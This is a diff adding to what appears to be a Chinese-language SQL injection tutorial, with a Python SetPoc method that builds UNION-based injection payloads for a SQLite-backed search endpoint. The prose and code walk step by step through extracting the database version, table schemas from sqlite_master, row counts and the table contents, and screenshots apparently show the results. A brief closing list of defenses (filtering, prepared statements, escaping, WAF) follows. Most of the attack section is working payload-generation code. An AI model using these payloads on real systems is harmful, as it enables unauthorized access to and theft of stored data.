@@ -62,3 +62,64 @@ def SetPoc(self, action):
             tabnumpoc_end = " from sqlite_master--&q=&pageIndex=1&searchname=&_=1522659952172"
             tabnumpoc = tabnumpoc_start + self.poc_mid + tabnumpoc_end
             return tabnumpoc
+
+
+通过上步获取的order by长度，再调用内置函数sqlite_version()，获取版本信息，poc类似％'  and 1 = 2 UNION SELECT null,sqlite_version() ，Sqlite数据库的字符型、搜索类型注入，和Oracle数据库一样，可以通过使用null进行注入。这里将发送包分成三部分进行拼接，第一部分是类似123％' and 1 = 2 union select null,sqlite_vetsion()，这部分将根据要查询的信息进行变化，如查询所有表名，则使用123％' and 1 = 2 union select null,name；第二部分则根据前面获取的order by 长度，补齐缺少的null，第三部分则根据要查询条件进行修改
+
+        # 获取版本信息的poc
+        elif action == "version":
+            verpoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
+                           "and 1=2 UNION SELECT null,'<xxoo>'||sqlite_version()||'</xxoo>'"
+            verpoc_end = " from sqlite_master--&q=&pageIndex=1&searchname=&_=1522659952172"
+            order_num = self.OrderBy
+            while order_num > 2:
+                self.poc_mid = self.poc_mid + ",null"
+                order_num = order_num - 1
+            verpoc = verpoc_start + self.poc_mid + verpoc_end
+            #print self.poc_mid
+            return verpoc
+            
+            
+![image](https://github.com/silience/sql/blob/master/image/tables.png)
+
+sqlite_master表和mysql数据库中系统表information_schema不一样的是，sqlite_master不存在类似“column_name”的字段，但是她有一个sql字段，该字段保存了各个表的结构，包括表名，字段名和类型。因此可以通过查询sql字段获取各个表的列名。
+
+        # 获取所有表结构的poc
+        elif action == "columns":
+            columnspoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
+                   "and 1=2 UNION SELECT null,'<xxoo>'||sql||'</xxoo>'"
+            columnspoc_end = " from sqlite_master limit 0,{0}--&q=&pageIndex=1&searchname=&_=1522659952172".format(self.table_num)
+            columnspoc = columnspoc_start + self.poc_mid + columnspoc_end
+            return columnspoc
+            
+![image](https://github.com/silience/sql/blob/master/image/columns.png)
+
+通过前面获取的表名和列名，再获取具体内容，类似的poc为123％' and 1 = 2 UNION SELECT null,column_name,null from table_name--。
+
+        # 获取指定表数据条数的poc
+        elif action == "datanum":
+            datanumpoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
+                   "and 1=2 UNION SELECT null,'<xxoo>'||count(1)||'</xxoo>'"
+            datanumpoc_end = " from {0}--&q=&pageIndex=1&searchname=&_=1522659952172".format(table_name)
+            datanumpoc = datanumpoc_start + self.poc_mid + datanumpoc_end
+            return datanumpoc
+
+        # 获取具体数据的poc
+        elif action == "data":
+            datapoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
+                "and 1=2 UNION SELECT null,'<xxoo>'||{0}||'</xxoo>'".format(column_name)
+            datapoc_end = " from {0} limit 0,{1}--&q=&pageIndex=1&searchname=&_=1522659952172".format(table_name, self.column_num)
+            datapoc = datapoc_start + self.poc_mid + datapoc_end
+            return datapoc
+            
+![image](https://github.com/silience/sql/blob/master/image/data.png)
+
+0×04：SQL注入防御
+
+1，使用白名单或者黑名单进行全局过滤，防止二次注入
+
+2，强制使用预编译，参数化语句，如JSP的PreparedStatement的setString方法等
+
+3，前端JS过滤，如调用escape方法
+
+4，借助第三方安全防御软件，如WAF
